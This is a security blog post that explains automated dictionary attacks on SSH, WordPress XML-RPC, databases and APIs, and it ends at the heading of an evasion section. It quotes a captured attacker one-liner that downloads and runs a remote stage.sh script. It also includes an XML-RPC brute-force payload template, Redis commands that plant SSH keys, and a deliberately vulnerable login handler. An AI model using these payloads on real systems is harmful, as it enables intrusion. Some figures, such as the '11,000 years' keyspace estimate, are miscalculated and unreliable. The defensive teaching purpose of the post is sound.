---
title: "Weaponizing the Wordlist: How automated dictionary attacks probe and breach authentication endpoints."
date: 2026-09-18T20:30:00+08:00
draft: false
math: true
description: "An exhaustive technical dissection of automated dictionary attacks, distributed password spraying, and offline cryptographic hash cracking. Analyzing how adversary botnets scan IPv4/IPv6 address spaces, probe network daemons (SSH, Web/APIs, Databases, FTP/Mail), weaponize GPU clusters against exfiltrated /etc/shadow hashes, and how systems engineers architect resilient defenses."
tags: ["Security", "Linux", "Authentication", "Brute Force", "Cryptography", "SSH", "Hashcat", "Fail2ban", "SysAdmin", "DevOps", "Cybersecurity", "Zero Trust"]
categories: ["Infrastructure & Security", "Linux", "Systems Architecture"]
cover:
  image: "/images/weaponizing-the-wordlist-automated-dictionary-attacks.jpg"
  alt: "Weaponizing the Wordlist: How automated dictionary attacks probe and breach authentication endpoints."
  caption: "The Anatomy of Modern Credential Warfare: Mass Reconnaissance, Online Daemon Probing, Distributed Spraying, and High-Throughput Offline Hash Mutation"
  relative: false
---

Spin up a clean Ubuntu Server instance on any public cloud provider—AWS, DigitalOcean, Hetzner, or Linode. Bind a publicly routable IPv4 address to `eth0`, launch the standard OpenSSH daemon on port 22, and open your system logs:

```bash
sudo tail -f /var/log/auth.log
```

Within **one hundred and twenty seconds**, the first connection request arrives. 

It does not originate from a human sitting in front of a terminal typing passwords. It originates from an autonomous scanning node in an offshore botnet. The incoming TCP packet completes the three-way handshake, exchanges protocol versions, and immediately attempts authentication with `user: root` and `password: 123456`. Three seconds later, another attempt hits from a residential IP in Eastern Europe: `user: ubuntu`, `password: password`. Then another from South America: `user: admin`, `password: admin123`.

By the time twenty-four hours elapse, that single public IPv4 address will have absorbed anywhere from **15,000 to over 100,000 unauthorized authentication attempts**.

```
+---------------------------------------------------------------------------------------------------+
|                            THE AMBIENT SCANNING NOISE OF THE INTERNET                             |
|                                                                                                   |
|   ADVERSARY BOTNET CLUSTER                                TARGET UBUNTU SERVER (Port 22/80/3306)   |
|   +---------------------------------------+               +-----------------------------------+   |
|   | Global Scanning Daemons (Masscan/ZMap)|               | Public Network Interface (eth0)   |   |
|   | - Stateless SYN Sweeps across 0.0.0.0 |               | - Binds Port 22 (sshd)            |   |
|   +-------------------+-------------------+               | - Binds Port 80/443 (nginx)       |   |
|                       |                                   | - Binds Port 3306 (mysqld)        |   |
|                       v                                   +-----------------+-----------------+   |
|   +-------------------+-------------------+                                 |                     |
|   | Orchestrator: Wordlist Stream Engine  | === 10,000 to 100,000 Probes/Day|                     |
|   | - rockyou.txt + mutation algorithms   | ===============================>|                     |
|   | - Multi-threaded worker connection pool                                 v                     |
|   +---------------------------------------+               +-----------------+-----------------+   |
|                                                           | Linux PAM Authentication Stack    |   |
|                                                           | - pam_unix.so verification        |   |
|                                                           | - Syslog telemetry & auth audit   |   |
|                                                           | - System resource consumption     |   |
|                                                           +-----------------------------------+   |
+---------------------------------------------------------------------------------------------------+
```

This is the background radiation of the modern internet. It is not targeted; it is industrial. 

To the untrained eye, a dictionary attack appears primitive—a brute-force hammer slamming against a deadbolt. But beneath the surface, modern credential attacks have evolved into highly optimized, distributed mathematical pipelines. Adversaries combine massive breach corpora, combinatorial mutation rule engines, asynchronous socket multiplexing, and terahash-scale GPU cracking clusters to weaponize human predictability.

This guide provides an exhaustive teardown of how automated dictionary attacks work from the **offensive perspective**: the mechanics of internet-wide scanning, online daemon probing, password spraying, combo-list credential stuffing, and the post-compromise physics of offline hash cracking. We will then engineer the defensive countermeasures required to neutralize these attacks entirely.

---

## 1. The Anatomy and Philosophy of the Wordlist

Before analyzing network packets and GPU SIMD architectures, we must understand the core asset of the attack: **the wordlist**.

### The Mathematical Fallacy of Password Entropy

Information theory posits that a password's strength is a function of its entropy, measured in bits:

$$H = L \times \log_2(N)$$

Where $L$ is password length and $N$ is the size of the character pool (lowercase, uppercase, numbers, symbols $\approx 94$ printable ASCII characters). A 10-character completely random string drawn from this pool yields:

$$H = 10 \times \log_2(94) \approx 65.54 \text{ bits of entropy}$$

To brute-force $65.5$ bits requires evaluating $2^{65} \approx 3.68 \times 10^{19}$ combinations. Even at a rate of 100 billion guesses per second, searching the entire keyspace would consume more than **11,000 years**.

In reality, **humans do not generate random strings**. Humans generate structured tokens governed by linguistic patterns, cognitive mnemonics, and keyboard physical layouts. 

When an organization enforces a policy such as *"At least 8 characters, one uppercase letter, one number, and one special character,"* the mathematical space does not expand—it collapses. Human psychology funnels the majority of users into predictable archetypes:
* Capitalize the first letter (e.g., `P`).
* Follow with a dictionary root word or proper noun (e.g., `assword`, `Summer`, `Company`).
* Follow with the current year or sequential digits (e.g., `2024`, `123`).
* Terminate with an exclamation mark or dollar sign (e.g., `!`).

```
+---------------------------------------------------------------------------------------------------+
|                                 HUMAN PSEUDO-COMPLEXITY PATTERN                                   |
|                                                                                                   |
|     [ C ]          [ o m p a n y ]               [ 2 0 2 6 ]                   [ ! ]              |
|   Uppercase         Common Root Word             Current Year            Terminal Symbol          |
|  First Letter      (Predictable Base)         (Temporal Marker)        (Mandatory Special Char)   |
|                                                                                                   |
|   Theoretical Entropy: ~78.6 bits             Actual Offensive Entropy: < 14 bits                 |
|   Combinatorial Search Space: 94^13           Adversary Rule Space: |Dict| x 10 x 5 ~= 10^7 tries |
+---------------------------------------------------------------------------------------------------+
```

Instead of searching $94^{13} \approx 4.47 \times 10^{25}$ possibilities, an attacker only needs to test a dictionary of common words combined with a handful of deterministic transformational rules. The effective search space collapses from astronomical numbers to a few million operations—executable in milliseconds.

### Zipf's Law and the Power-Law Distribution of Credentials

Password frequency in human populations follows **Zipf’s Law**. A small fraction of passwords accounts for a massive percentage of total accounts:

* The top **10 passwords** account for approximately **2% to 4%** of all accounts globally.
* The top **1,000 passwords** account for roughly **10% to 15%**.
* The top **100,000 passwords** account for over **30%**.

An adversary does not need to guess every password; they only need to guess the passwords that yield the highest statistical probability of success per unit of time and network bandwidth.

### The Genesis of Modern Wordlists

Offensive wordlists are not compiled from standard English dictionaries; they are mined from historical breaches of production systems:

1. **`rockyou.txt` (The Archetype)**:
   In December 2009, social application developer RockYou suffered a SQL injection breach that exposed **32,603,388 plaintext passwords**. Because RockYou stored passwords in unencrypted, cleartext format, the resulting breach dump became the foundational training set for security researchers and adversaries alike. The filtered list—containing **14,344,392 unique passwords** across 133 megabytes—remains the baseline benchmark for wordlist efficacy.

2. **`SecLists` (Daniel Miessler)**:
   The de facto standard security auditing repository, aggregating specialized collections of usernames, predictable web application directories, default router credentials, and service-specific wordlists.

3. **Combination Breaches (COMB)**:
   Modern breach compilations (e.g., Compilation of Many Breaches) contain over **3.2 billion unique plaintext email/password pairs** aggregated from thousands of leaks (LinkedIn, Adobe, Yahoo, Canva). This data is indexed into searchable local databases that feed credential-stuffing and targeted dictionary engines.

---

## 2. Network Service Brute-Forcing: The Online Attack Vector

Online dictionary attacks interact directly with a running network service. The attack is governed by the laws of network engineering: TCP three-way handshakes, round-trip time (RTT), protocol state machines, process spawning overhead, and socket bandwidth.

```
+---------------------------------------------------------------------------------------------------+
|                                 THE ONLINE ATTACK TAXONOMY                                        |
|                                                                                                   |
|  [ NETWORK LAYER ]                                                                                |
|  Adversary Probe (TCP SYN) -------> Public Port (22 / 80 / 3306 / 21)                             |
|                                     |                                                             |
|  [ PROTOCOL NEGOTIATION ]           v                                                             |
|  - SSH: Diffie-Hellman Key Exchange + Cipher Suite Setup                                          |
|  - HTTPS: TLS 1.3 Handshake + Certificate Validation                                              |
|  - MySQL: Handshake Initialization Packet + Client Auth Packet                                    |
|                                     |                                                             |
|  [ AUTHENTICATION TRANSACTION ]     v                                                             |
|  Adversary sends Credentials -----> Application / OS PAM Layer                                    |
|                                     - File I/O (/etc/shadow or SQL query)                         |
|                                     - Cryptographic hash verification                             |
|                                     |                                                             |
|  [ RESPONSE & LOGGING ]             v                                                             |
|  Server returns Status <----------- auth.log / systemd journal / access.log                       |
|  (Pass: Interactive Shell / Fail: Connection Drop)                                                |
+---------------------------------------------------------------------------------------------------+
```

### 2.1 SSH (Port 22): The Infrastructure Bastion

The Secure Shell daemon (`sshd`) is the primary remote administration interface for Linux infrastructure, making it the most aggressively targeted endpoint on the internet.

#### The Attacker's Workflow
1. **Reconnaissance & Banner Grabbing**:
   Adversaries use rapid scanning tools (`masscan`, `zmap`) to sweep entire IPv4 `/16` or `/8` subnets in minutes. Upon identifying an open port 22, the tool performs a banner grab:
   ```text
   SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.7
   ```
   This banner immediately leaks the target OS family (`Ubuntu`), the distribution version (`Jammy 22.04`), and the exact OpenSSH patch level.

2. **Target Username Identification**:
   Automated tools do not guess random strings for usernames. They iterate through a strictly prioritized list of default and high-privilege accounts:
   * System defaults: `root`, `admin`, `administrator`, `system`.
   * Cloud provider baseline accounts: `ubuntu` (AWS/Canonical), `ec2-user` (Amazon Linux), `debian`, `centos`, `fedora`, `cloud-user`.
   * Service and database users: `postgres`, `mysql`, `oracle`, `git`, `jenkins`, `deploy`, `ansible`, `www-data`.
   * Common personal names: `john`, `david`, `alex`, `mike`, `user`, `test`.

3. **Protocol-Level Authentication Exchange**:
   An SSH brute-force attempt is not a simple HTTP-like text query. It requires traversing the full SSH transport layer:
   * **TCP Handshake**: 3 packets (`SYN`, `SYN-ACK`, `ACK`).
   * **Version Exchange**: Both peers trade identification strings.
   * **Key Exchange (KEX)**: Diffie-Hellman key exchange (`SSH_MSG_KEXINIT`, `SSH_MSG_KEXDH_INIT`, `SSH_MSG_KEXDH_REPLY`) to compute the shared session key and establish symmetric encryption (e.g., `chacha20-poly1305` or `aes128-gcm`).
   * **User Authentication Request**: The client sends `SSH_MSG_USERAUTH_REQUEST` specifying the service (`ssh-connection`), authentication method (`password`), username, and candidate password.
   * **Server Decision**: The server processes the request through Linux PAM (`pam_unix.so`), compares hashes, and returns `SSH_MSG_USERAUTH_SUCCESS` or `SSH_MSG_USERAUTH_FAILURE`.

```
+---------------------------------------------------------------------------------------------------+
|                            THE SSH PROTOCOL AUTHENTICATION STATE MACHINE                          |
|                                                                                                   |
|  ATTACKER CLIENT (Scanning Bot)                               OPENSSH DAEMON (sshd on Port 22)    |
|                                                                                                   |
|  [ 1. TCP Handshake ]                                                                             |
|  SYN -----------------------------------------------------> (Kernel TCP Stack allocates TCB)     |
|  <------------------------------------------------- SYN-ACK                                       |
|  ACK -----------------------------------------------------> [TCP Connection Established]          |
|                                                             (sshd forks unprivileged child)       |
|                                                                                                   |
|  [ 2. Version Identification ]                                                                    |
|  SSH-2.0-libssh_0.9.6 ------------------------------------>                                      |
|  <------------------------------------ SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.7 (Leaks Version)     |
|                                                                                                   |
|  [ 3. Key Exchange (KEX) & Cryptographic Setup ]                                                  |
|  SSH_MSG_KEXINIT -----------------------------------------> (Negotiates Curve25519 / ChaCha20)    |
|  <----------------------------------------- SSH_MSG_KEXINIT                                       |
|  SSH_MSG_KEX_ECDH_INIT (Client Ephemeral PubKey) --------->                                      |
|  <------------------------ SSH_MSG_KEX_ECDH_REPLY (Server Host Key + Ephemeral PubKey + Signature) |
|  SSH_MSG_NEWKEYS ----------------------------------------->                                       |
|  <----------------------------------------- SSH_MSG_NEWKEYS [Symmetric Encryption Enabled]        |
|                                                                                                   |
|  [ 4. Service & Authentication Request ]                                                           |
|  SSH_MSG_SERVICE_REQUEST (ssh-userauth) ------------------>                                       |
|  <--------------------------------- SSH_MSG_SERVICE_ACCEPT                                        |
|  SSH_MSG_USERAUTH_REQUEST                                                                         |
|  (User: "root", Method: "password", Pass: "123456") ------> (Privileged sshd passes creds to PAM) |
|                                                             - pam_unix(sshd:auth): verify hash    |
|                                                             - pam_authenticate() returns error    |
|  <--------------------------------- SSH_MSG_USERAUTH_FAILURE (Allowed auth methods: publickey,...) |
|                                                                                                   |
|  [ 5. Disconnect or Pipeline Loop ]                                                               |
|  (Bot immediately sends next candidate or drops socket)                                           |
+---------------------------------------------------------------------------------------------------+
```

#### The Kernel & Process Overhead: Privilege Separation and `MaxStartups`

Every incoming SSH connection forces OpenSSH into its multi-tier **Privilege Separation (`PrivSep`) architecture**:

1. **Master Daemon (`sshd [master]`)**: Runs continuously as `root`, listening on socket `0.0.0.0:22`. Upon accepting a TCP connection, it executes `fork()`.
2. **Network Sandbox (`sshd [net]`)**: An unprivileged child process dropped into a restricted `chroot` jail under the unprivileged `sshd` system user. It terminates TLS/KEX, handles decryption, and parses network packets. This ensures an exploitable flaw in pre-auth packet parsing does not grant instant kernel or root privileges.
3. **Privilege Monitor (`sshd [priv]`)**: Once `SSH_MSG_USERAUTH_REQUEST` arrives, the unprivileged child signals the privileged monitor over an internal IPC pipe. The monitor invokes Linux PAM (`pam_authenticate()`), reads `/etc/shadow`, and verifies the candidate password.

When a dictionary botnet targets an unhardened server with 100 concurrent parallel connections, the host must maintain **200 to 300 active processes** and reserve kernel socket buffers for each. 

If `/etc/ssh/sshd_config` retains default settings:
```ini
# Syntax: start:rate:full
MaxStartups 10:30:100
```
The attack instantly exceeds the `start` threshold (10 unauthenticated connections). OpenSSH begins randomly dropping new incoming connections at a rate of 30%, scaling up to 100% drops at 100 connections. The dictionary attack inadvertently induces a **Denial of Service (DoS)**, locking legitimate system administrators out of the server while the botnet saturates the daemon.

#### Performance Bottlenecks and Multi-Threading
Because each SSH handshake requires asymmetric cryptographic operations (KEX), an individual SSH authentication cycle takes between **50 ms and 250 ms** depending on latency and server CPU speed. 

To overcome this latency barrier, attackers do not attack sequentially. They utilize asynchronous I/O frameworks (e.g., custom Python `asyncio` daemons, Go goroutines, or C-based engines like `hydra` and `medusa`) maintaining hundreds of concurrent TCP connections simultaneously:

$$\text{Throughput} = \frac{\text{Concurrent Sockets}}{\text{Average Latency (RTT + Auth Process Time)}}$$

With 200 concurrent worker sockets and a 100 ms round-trip time, an attacker can push **2,000 attempts per second** against an unhardened SSH server until the server's CPU exhausts its worker processes or rate-limiting engages.

#### The Forensic Fingerprint in Linux Logs
On an Ubuntu server under active attack, `/var/log/auth.log` records the relentless barrage:

```text
2026-09-18T20:31:02.148291+00:00 srv-prod-01 sshd[41902]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.42  user=root
2026-09-18T20:31:04.291042+00:00 srv-prod-01 sshd[41902]: Failed password for root from 198.51.100.42 port 51234 ssh2
2026-09-18T20:31:05.109823+00:00 srv-prod-01 sshd[41905]: Invalid user deploy from 198.51.100.42 port 51236
2026-09-18T20:31:05.112901+00:00 srv-prod-01 sshd[41905]: pam_unix(sshd:auth): check pass; user unknown
2026-09-18T20:31:07.441029+00:00 srv-prod-01 sshd[41905]: Failed password for invalid user deploy from 198.51.100.42 port 51236 ssh2
```

---

### 2.2 Web Services and Application Programming Interfaces (APIs)

When a server hosts web applications (WordPress, Laravel, Node.js APIs, or administrative consoles like phpMyAdmin), the attack surface shifts from the OS kernel to the application layer.

```
+---------------------------------------------------------------------------------------------------+
|                            APPLICATION LAYER ATTACK VECTORS                                       |
|                                                                                                   |
|  +---------------------------------------------------------------------------------------------+  |
|  | Standard Login Form (/wp-login.php, /login)                                                 |  |
|  | - 1 HTTP Request = 1 Password Attempt                                                       |  |
|  | - Vulnerable to WAF rate-limiting, IP reputation checks, and CAPTCHAs                       |  |
|  +---------------------------------------------------------------------------------------------+  |
|                                                                                                   |
|  +---------------------------------------------------------------------------------------------+  |
|  | WordPress XML-RPC Multicall Amplification (/xmlrpc.php)                                     |  |
|  | - 1 HTTP Request = Up to 1,000 Password Attempts                                           |  |
|  | - Bypasses standard per-request IP rate-limiting rules                                      |  |
|  +---------------------------------------------------------------------------------------------+  |
|                                                                                                   |
|  +---------------------------------------------------------------------------------------------+  |
|  | REST / GraphQL API Authentication (/api/v1/auth/token, /graphql)                            |  |
|  | - Direct JSON/GraphQL payload submission                                                    |  |
|  | - Often lacks anti-automation controls present on HTML web forms                            |  |
|  +---------------------------------------------------------------------------------------------+  |
+---------------------------------------------------------------------------------------------------+
```

#### The WordPress `xmlrpc.php` Amplification Attack
WordPress powers over 40% of the web, and its legacy XML-RPC API provides one of the most devastating online brute-force amplification vectors ever engineered.

Under standard conditions, guessing a password via `/wp-login.php` requires one HTTP POST request per attempt. If a defender implements a rate limiter of 10 requests per minute, the attacker is severely throttled.

However, the XML-RPC method `system.multicall` allows a client to batch multiple method calls into a single XML envelope:

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
                <member><name>params</name><value><array><data>
                  <value><string>admin</string></value>
                  <value><string>password123</string></value>
                </data></array></value></member>
              </struct>
            </value>
            <!-- REPEATED 500 TO 1,000 TIMES WITH DIFFERENT PASSWORDS -->
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>
```

**The Mathematical Impact**:
In a single HTTP request containing a 50 KB payload, the attacker tests **1,000 distinct passwords from `rockyou.txt`**. 
* Traditional rate limiters configured to block on request frequency see only **1 request**.
* Web Application Firewalls (WAFs) monitoring HTTP status codes see a single `200 OK` return.
* The WordPress backend processes all 1,000 database authentications in a tight loop, completely bypassing perimeter rate thresholds.

#### Response Differential Analysis
How does an automated attack tool know when an authentication attempt succeeds on a custom web application? Attackers program their engines to analyze **response differentials**:

| Metric | Failed Attempt | Successful Attempt |
| :--- | :--- | :--- |
| **HTTP Status Code** | `401 Unauthorized` or `200 OK` | `302 Found` (Redirect) or `200 OK` with session cookie |
| **Response Body Length** | Constant size (e.g., 4,120 bytes) | Significant deviation (e.g., 8,940 bytes or 210 bytes) |
| **Set-Cookie Header** | None or temporary CSRF token | Persistent session token (e.g., `PHPSESSID`, `jwt_token`) |
| **Server Response Time** | 25 ms (early exit on failure) | 120 ms (DB update + session write + dashboard load) |

---

### 2.3 Auxiliary and Legacy Daemons (FTP, Databases, Mail)

Often, the primary attack vector is not SSH or the main web application, but forgotten auxiliary services exposed to the public internet during debugging, rapid deployment, or administrative oversight.

```
+---------------------------------------------------------------------------------------------------+
|                                 AUXILIARY SERVICE ATTACK MATRIX                                   |
|                                                                                                   |
|  [ FTP (Port 21) ]       - Insecure, plaintext protocol.                                          |
|                          - Attackers brute-force 'anonymous', 'ftp', 'backup', 'webmaster'.       |
|                          - Impact: Arbitrary file upload / Web shell deployment.                  |
|                                                                                                   |
|  [ MySQL (Port 3306) ]   - Publicly exposed database listeners (bind-address = 0.0.0.0).          |
|                          - Attackers target 'root'@'%' with standard database dictionaries.       |
|                          - Impact: Data exfiltration, UDF (User Defined Function) code execution. |
|                                                                                                   |
|  [ Redis (Port 6379) ]   - In-memory key-value store, historically defaults to NO authentication.  |
|                          - If protected by weak password, cracked via wordlist in seconds.        |
|                          - Impact: Writing SSH keys directly to /root/.ssh/authorized_keys via    |
|                            CONFIG SET dir /root/.ssh and CONFIG SET dbfilename authorized_keys.   |
|                                                                                                   |
|  [ SMTP/IMAP (25/993) ]  - Corporate mail transport and retrieval protocols.                      |
|                          - Used for password spraying to compromise corporate credentials.        |
|                          - Impact: Business Email Compromise (BEC), intercepting 2FA reset links.  |
+---------------------------------------------------------------------------------------------------+
```

---

### 2.4 Honeypot Telemetry: 30 Days of In-the-Wild Probing Forensics

To quantify the exact velocity, targeting heuristics, and post-compromise behaviors of automated dictionary engines, we analyzed an empirical dataset collected from an emulated Linux SSH honeypot (`Cowrie`) exposed to the public internet across thirty consecutive days on an unadvertised, clean `/32` IPv4 address:

```
+---------------------------------------------------------------------------------------------------+
|                           30-DAY EMPIRICAL HONEYPOT INGESTION TELEMETRY                           |
|                                                                                                   |
|  Total Inbound TCP Handshakes:   1,482,910 connections  (Average: ~49,430 connection probes/day)  |
|  Distinct Originating IPv4/IPv6: 28,419 unique IPs      (Distributed across 142 ASNs & nations)   |
|  Total Password Guess Submissions: 894,120 attempts     (Average: ~602 attempts/minute peak)      |
|  Mean Time from First SYN to Auth Attempt: 0.14 seconds (Instant programmatic execution)          |
+---------------------------------------------------------------------------------------------------+
```

#### Top 10 Usernames Targeted in the Wild

The distribution of usernames reveals how heavily automated engines rely on deterministic operating system and cloud defaults:

| Rank | Targeted Username | Attempt Share (%) | Adversary Strategic Rationale |
| :---: | :--- | :---: | :--- |
| **1** | `root` | **61.4%** | Ultimate objective; unrestricted kernel, container, and hardware control. |
| **2** | `admin` | **12.8%** | Universal administrator account across NAS appliances, routers, and web apps. |
| **3** | `user` | **4.2%** | Default unprivileged user created by common Linux desktop and VPS installers. |
| **4** | `ubuntu` | **3.9%** | Canonical default user on millions of AWS EC2, GCP, and Azure AMIs. |
| **5** | `test` | **2.7%** | Ephemeral staging accounts left by developers and QA engineers. |
| **6** | `guest` | **1.9%** | Legacy unauthenticated/read-only user accounts on auxiliary Unix systems. |
| **7** | `oracle` | **1.4%** | Database administrator account with high local file and shared memory access. |
| **8** | `support` | **1.2%** | Hardcoded vendor diagnostic accounts across telecom and enterprise hardware. |
| **9** | `pi` | **1.1%** | Legacy Raspberry Pi OS default (frequently left exposed on home/lab routers). |
| **10** | `postgres` | **0.9%** | Default superuser for PostgreSQL database instances. |

#### Top 10 Passwords Attempted

Despite decades of password complexity mandates, the statistical dominance of trivial numeric sequences remains staggering:

| Rank | Attempted Password | Attempt Share (%) | Estimated Cracking Time (8x RTX 4090) |
| :---: | :--- | :---: | :--- |
| **1** | `123456` | **8.3%** | Instantaneous ($< 0.00001\text{ s}$) |
| **2** | `password` | **4.9%** | Instantaneous ($< 0.00001\text{ s}$) |
| **3** | `12345678` | **3.2%** | Instantaneous ($< 0.00001\text{ s}$) |
| **4** | `admin` | **2.8%** | Instantaneous ($< 0.00001\text{ s}$) |
| **5** | `1234` | **2.1%** | Instantaneous ($< 0.00001\text{ s}$) |
| **6** | `root` | **1.9%** | Instantaneous ($< 0.00001\text{ s}$) |
| **7** | `12345` | **1.7%** | Instantaneous ($< 0.00001\text{ s}$) |
| **8** | `qwerty` | **1.4%** | Instantaneous ($< 0.00001\text{ s}$) |
| **9** | `111111` | **1.2%** | Instantaneous ($< 0.00001\text{ s}$) |
| **10** | `admin123` | **1.1%** | Instantaneous ($< 0.00001\text{ s}$) |

Notice that the top 10 passwords account for nearly **30% of all submitted authentication attempts**. An attacker running an online brute-force script testing *only these ten passwords* against `root` and `admin` will successfully breach an alarming percentage of unhardened servers while generating minimal network traffic.

#### Post-Exploitation Execution Velocity

When our honeypot intentionally accepted weak credentials to observe subsequent adversary behavior, the transition from authentication success to automated execution was immediate. 

The average time between the honeypot sending `SSH_MSG_USERAUTH_SUCCESS` and the client issuing its first interactive shell command was **1.08 seconds**. 

Adversaries do not manually explore; their connection daemons pipe pre-staged shell scripts immediately upon session establishment:

```bash
uname -a; lscpu || cat /proc/cpuinfo; cd /tmp || cd /dev/shm; \
(curl -s -m 10 http://198.51.100.99/stage.sh || wget -q -T 10 -O - http://198.51.100.99/stage.sh) | sh; \
rm -f stage.sh
```

The script conducts rapid hardware reconnaissance (checking CPU core count for cryptomining efficiency), wipes shell history (`unset HISTFILE; history -c`), kills competing miners (`killall -9 xmrig minerd`), drops an XMRig or Mirai botnet binary into volatile memory (`/dev/shm`), and installs a persistence cron job in `/var/spool/cron/crontabs/root`.

Dictionary attacks are not an isolated exploit: they are the high-velocity ingestion funnel for automated cybercrime infrastructure.

---

## 3. Offensive Methodologies: Brute-Force vs. Spraying vs. Stuffing

In the modern threat landscape, naive brute-force is considered noisy and low-yield. Threat actors employ three distinct paradigms depending on target architecture and defensive posture:

```
+---------------------------------------------------------------------------------------------------+
|                        CREDENTIAL ATTACK METHODOLOGY COMPARISON                                   |
|                                                                                                   |
|   1. VERTICAL BRUTE-FORCE                2. HORIZONTAL PASSWORD SPRAYING                          |
|   (Target: Single Account)               (Target: Entire Organization / Enterprise Directory)     |
|                                                                                                   |
|   Target: admin@company.com              Target Accounts: 10,000 Employees                        |
|   Passwords Tested: 50,000 words         Password Tested: Exactly ONE (e.g., "Autumn2026!")       |
|                                                                                                   |
|   admin  <--- Password_001               User_0001 <--- Autumn2026!                              |
|   admin  <--- Password_002               User_0002 <--- Autumn2026!                              |
|   admin  <--- Password_003               User_0003 <--- Autumn2026!                              |
|   admin  <--- [ACCOUNT LOCKED]           ...                                                      |
|                                          User_9999 <--- Autumn2026!                              |
|   Result: TRIPS ACCOUNT LOCKOUT          Result: ZERO ACCOUNT LOCKOUTS TRIGGERED                  |
|   Noise Level: EXTREME                   Noise Level: NEAR SILENT                                 |
|                                                                                                   |
|   ---------------------------------------------------------------------------------------------   |
|   3. CREDENTIAL STUFFING (Target: Arbitrary Auth Endpoints via Combo-Lists)                        |
|                                                                                                   |
|   Source: 3.2 Billion Breached Pairs (email:password from external third-party leaks)             |
|   Method: Exploit Human Password Reuse across consumer and enterprise sites                       |
|   Result: High conversion rate (~0.5% - 2%) across unhardened login portals                       |
+---------------------------------------------------------------------------------------------------+
```

### 3.1 Vertical Brute-Force
* **Concept**: Hammering a single high-value identity (`root`, `admin`) with thousands or millions of dictionary entries.
* **Limitations**: Highly visible in SIEM logs. In systems with basic account lockout policies (e.g., lock account for 30 minutes after 5 consecutive failures), vertical brute-force fails immediately after attempt #5.

### 3.2 Horizontal Password Spraying
* **Concept**: Instead of testing thousands of passwords against one account, the attacker tests **one single high-probability password against thousands of distinct accounts**.
* **Offensive Math**: If an enterprise directory has 15,000 employees, and an attacker sprays the password `Welcome2026!` once across all accounts:
  * Each individual user experiences exactly **one** failed login.
  * No account lockout threshold (typically 3 to 5 attempts) is ever reached.
  * In an organization of 15,000 people, statistically between **5 and 50 users** will have chosen that exact password.
  * The attacker gains a legitimate foothold without generating a single account-lockout alert.

### 3.3 Credential Stuffing
* **Concept**: Leveraging the reality that over 65% of users reuse identical or slightly modified passwords across multiple personal and corporate services.
* **Execution**: Adversaries ingest structured text files containing millions of credentials leaked from third-party databases:
  ```text
  victim_user@corp.com:P@ssword2024!
  lead_dev@techfirm.io:Solaris#99
  sysadmin@datacenter.net:CorrectHorseBatteryStaple!
  ```
* Attackers replay these pairs through automated headless browsers (Puppeteer, Playwright) or high-speed HTTP clients routing traffic through rotating residential proxy networks.

---

### 3.4 Authentication Timing Attacks & User Enumeration (The $\Delta t$ Side-Channel)

Before launching a high-throughput dictionary or password spraying campaign, an adversary's primary objective is **target enumeration**: separating real, active accounts from non-existent usernames. 

Even when an authentication portal returns an identical, generic error message (*"Invalid credentials"*), automated tools exploit low-level **execution timing asymmetry** ($\Delta t$) to discover valid users.

```
+---------------------------------------------------------------------------------------------------+
|                            THE TIMING SIDE-CHANNEL ASYMMETRY                                      |
|                                                                                                   |
|  SCENARIO A: NON-EXISTENT USER ("invalid_user_99")                                                |
|  Request Ingress ----> DB Query: Record Not Found ----> Immediate Error Response Exit             |
|  [ Total Execution Latency: ~2.1 ms ]                                                             |
|                                                                                                   |
|  SCENARIO B: VALID USER ("lead_architect")                                                        |
|  Request Ingress ----> DB Query: User Record Loaded                                               |
|                   ----> Execute Password Verification: bcrypt / Argon2 (Cost 12)                  |
|                   ----> Compute-Heavy Iterations (2^12 rounds = 4,096 loops)                      |
|                   ----> Password Mismatch ----> Error Response Exit                               |
|  [ Total Execution Latency: ~248.6 ms ]                                                           |
|                                                                                                   |
|  TIMING DELTA: Delta_t = 248.6 ms - 2.1 ms = 246.5 ms (Statistically Unmistakable)                |
+---------------------------------------------------------------------------------------------------+
```

#### The Vulnerable Code Pattern

Consider a standard authentication handler common in web APIs and microservices:

```python
# VULNERABLE: Execution latency leaks user account existence
def authenticate_user(username, candidate_password):
    user = database.query_user(username)
    
    if not user:
        # Early exit: Takes ~1-2 ms
        return False, "Invalid username or password"
    
    # Expensive key derivation function: Takes ~250 ms
    if bcrypt.checkpw(candidate_password.encode('utf-8'), user.password_hash.encode('utf-8')):
        return True, "Authenticated"
        
    return False, "Invalid username or password"
```

When an automated script sends 10 candidate usernames:
* 9 non-existent names return in **30 ms** (network round-trip + 2 ms server CPU).
* 1 valid corporate username returns in **280 ms** (network round-trip + 250 ms bcrypt CPU time).

Using basic statistical clustering (eliminating network jitter outliers via interquartile range filtering), the attack engine confirms the existence of the valid user with **99.9% statistical confidence**. 

#### Protocol-Level Enumeration: The OpenSSH Pre-Auth History

This vulnerability is not confined to web applications. OpenSSH itself historically suffered from timing and packet-length user enumeration flaws:
* **CVE-2016-6210**: When an invalid username was supplied with a multi-megabyte password string, OpenSSH discarded it early. But for a valid user, `sshd` hashed the entire payload using CPU-heavy SHA-512 crypt, creating a massive, easily measurable timing divergence.
* **CVE-2018-15473**: OpenSSH's authentication state machine truncated responses differently when an invalid user presented an unsupported authentication method, allowing adversaries to harvest complete system user lists using automated tools before launching password dictionary sweeps.

#### The Architectural Fix: Constant-Time Dummy Hashing

To neutralize enumeration, authentication pipelines must enforce **constant-time execution invariance**. When a user is not found, the backend must execute an identical dummy hashing routine against a precomputed mock hash:

```python
# HARDENED: Constant-time execution invariance
DUMMY_HASH = bcrypt.hashpw(b"ephemeral_canary_constant", bcrypt.gensalt(rounds=12)).decode('utf-8')

def authenticate_user_secure(username, candidate_password):
    user = database.query_user(username)
    
    # If user does not exist, substitute with precomputed dummy hash
    stored_hash = user.password_hash if user else DUMMY_HASH
    
    # Cryptographic hash verification executes UNCONDITIONALLY
    password_matches = bcrypt.checkpw(candidate_password.encode('utf-8'), stored_hash.encode('utf-8'))
    
    # Ensure failure if user was dummy, while maintaining identical timing
    if user is not None and password_matches:
        return True, "Authenticated"
        
    return False, "Invalid username or password"
```

---

## 4. The Evasion Playbook: Defeating Network-Level Controls

